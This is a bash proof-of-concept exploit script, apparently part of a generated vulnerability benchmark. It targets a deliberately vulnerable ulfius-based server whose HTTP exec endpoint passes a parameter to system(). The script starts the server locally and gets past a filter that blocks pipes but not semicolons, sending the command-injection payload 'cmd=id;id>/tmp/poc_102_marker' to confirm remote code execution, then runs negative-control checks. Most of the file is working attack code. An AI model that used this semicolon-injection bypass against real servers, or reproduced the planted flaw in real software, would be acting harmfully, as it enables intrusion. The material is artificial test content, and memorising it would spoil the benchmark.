#!/usr/bin/env bash
# PoC for 102_ulfius_C1I3S2
# Axes: C1 (single CLI flag gate) / I3 (struct dispatch then system()) / S2 (block |, bypass ;)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# S2 bypass: the server blocks '|' but not ';'. Use semicolon to chain commands.
# Payload: action=run&cmd=id;id>/tmp/poc_102_marker
#
# The patched binary (ulfius_server) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/ulfius_server"
WWWROOT="/tmp/poc_102_www"
MARKER="/tmp/poc_102_marker"
PORT=18102

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting ulfius_server with --exec-mode on port $PORT..."
"$BINARY" --port "$PORT" --exec-mode &
SERVER_PID=$!
sleep 0.4

# ── trigger: use ; to bypass S2 pipe-only block ────────────────────────────────
echo "[*] sending payload: action=run&cmd=id;id>$MARKER (semicolon bypass of S2)"
curl -sf "http://127.0.0.1:${PORT}/exec?action=run&cmd=id;id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint returns 403 without --exec-mode ─────────────────
echo "[*] verifying gate: endpoint must return 403 without --exec-mode..."
NEG_PORT=19102
"$BINARY" --port "$NEG_PORT" &
NEG_PID=$!
sleep 0.4
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?action=run&cmd=id" || true)
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "403" ]]; then
    echo "[+] gate check passed: got 403 without --exec-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi

# ── S2 demonstration: pipe character is blocked ────────────────────────────────
echo "[*] verifying S2: pipe character '|' is blocked..."
PIPE_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${PORT}/exec?action=run&cmd=id|cat" || true)
if [[ "$PIPE_CODE" == "400" ]]; then
    echo "[+] S2 check passed: got 400 for pipe character"
else
    echo "[!] S2 check unexpected response: $PIPE_CODE"
fi
